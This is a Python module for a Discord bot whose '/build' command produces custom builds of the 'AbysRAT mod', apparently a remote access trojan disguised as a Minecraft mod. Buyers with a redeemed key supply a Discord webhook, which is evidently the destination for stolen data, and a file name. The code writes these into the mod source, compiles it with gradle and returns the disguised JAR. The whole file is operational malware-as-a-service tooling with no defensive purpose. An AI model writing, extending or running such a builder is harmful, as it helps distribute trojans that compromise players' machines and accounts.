import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import re
import sys

# Build lock to ensure only one build at a time
build_lock = asyncio.Lock()

def edit_files(jar_name, webhook_url, mainmod_path, mcmodinfo_path):
    """Edit MainMod.java and mcmod.info files"""
    name_without_extension = jar_name.replace('.jar', '')
    
    # Edit MainMod.java
    with open(mainmod_path, 'r', encoding='utf-8') as f:
        content = f.read()
    content = content.replace('%NAME%', name_without_extension)
    content = content.replace('%WEBHOOK%', webhook_url)
    with open(mainmod_path, 'w', encoding='utf-8') as f:
        f.write(content)
    
    # Edit mcmod.info
    with open(mcmodinfo_path, 'r', encoding='utf-8') as f:
        mcmod_content = f.read()
    mcmod_content = mcmod_content.replace('%NAME%', name_without_extension)
    with open(mcmodinfo_path, 'w', encoding='utf-8') as f:
        f.write(mcmod_content)

def revert_files(mainmod_path, mcmodinfo_path):
    """Revert MainMod.java and mcmod.info files to placeholders"""
    # Revert MainMod.java
    with open(mainmod_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    name_match = re.search(r'public static final String NAME = "([^"]+)";', content)
    webhook_match = re.search(r'public static final String WEBHOOK_URL = "([^"]+)";', content)
    
    if name_match and webhook_match:
        content = content.replace(name_match.group(0), 'public static final String NAME = "%NAME%";')
        content = content.replace(webhook_match.group(0), 'public static final String WEBHOOK_URL = "%WEBHOOK%";')
        with open(mainmod_path, 'w', encoding='utf-8') as f:
            f.write(content)
    
    # Revert mcmod.info
    with open(mcmodinfo_path, 'r', encoding='utf-8') as f:
        mcmod_content = f.read()
    mcmod_content = re.sub(r'"name":\s*"[^"]+"', '"name": "%NAME%"', mcmod_content)
    with open(mcmodinfo_path, 'w', encoding='utf-8') as f:
        f.write(mcmod_content)

def setup(bot, keys_collection, authorized_ids, project_dir, build_dir, mainmod_path, mcmodinfo_path):
    @bot.tree.command(name='build', description='Build the AbysRAT mod')
    @app_commands.describe(
        webhook_url='Discord webhook URL',
        jar_name='JAR file name (without extension)'
    )
    async def build(interaction: discord.Interaction, webhook_url: str, jar_name: str):
        # Check if build is already in progress
        if build_lock.locked():
            await interaction.response.send_message('A build is already in progress. Please wait for it to complete.', ephemeral=True)
            return
        
        # Find user's redeemed key (don't check used status, allow unlimited builds)
        user_id = interaction.user.id
        key_doc = keys_collection.find_one({
            'redeemed_by': user_id
        })
        
        if not key_doc:
            await interaction.response.send_message('You do not have a redeemed key. Please redeem a key first with /redeem.', ephemeral=True)
            return
        
        key = key_doc['key']
        
        await interaction.response.send_message('Editing files and starting build...', ephemeral=True)
        
        async with build_lock:
            try:
                # Add .jar extension if not present
                if not jar_name.endswith('.jar'):
                    jar_name = jar_name + '.jar'
                
                # Edit files before build
                edit_files(jar_name, webhook_url, mainmod_path, mcmodinfo_path)
                
                # Execute build
                gradlew_path = project_dir / 'gradlew.bat'
                if not gradlew_path.exists():
                    raise Exception('gradlew.bat not found in project directory')
                
                # Use shell=True on Windows to execute .bat files
                if sys.platform == 'win32':
                    process = await asyncio.create_subprocess_shell(
                        f'"{gradlew_path}" build',
                        cwd=str(project_dir),
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                else:
                    process = await asyncio.create_subprocess_exec(
                        str(gradlew_path), 'build',
                        cwd=str(project_dir),
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                
                stdout, stderr = await process.communicate()
                
                if process.returncode != 0:
                    raise Exception(f'Build failed: {stderr.decode()}')
                
                # Revert files after build
                revert_files(mainmod_path, mcmodinfo_path)
                
                # Find the JAR file
                jar_files = [f for f in build_dir.glob('*.jar') if not f.name.endswith('-sources.jar')]
                
                if not jar_files:
                    await interaction.edit_original_response(content='No JAR file found after build!')
                    return
                
                original_jar = jar_files[0]
                new_jar_path = build_dir / jar_name
               
                if new_jar_path.exists():
                    new_jar_path.unlink()
                

                original_jar.rename(new_jar_path)
                
                file = discord.File(str(new_jar_path), filename=jar_name)
                await interaction.edit_original_response(
                    content=f'Build completed!',
                    attachments=[file]
                )
                
                try:
                    new_jar_path.unlink()
                except Exception as e:
                    print(f'Error deleting file: {e}')
                
            except Exception as e:
                print(f'Error in build: {e}')
                # Try to revert files even on error
                try:
                    revert_files(mainmod_path, mcmodinfo_path)
                except:
                    pass
                
                await interaction.edit_original_response(content=f'Build error: {str(e)}')
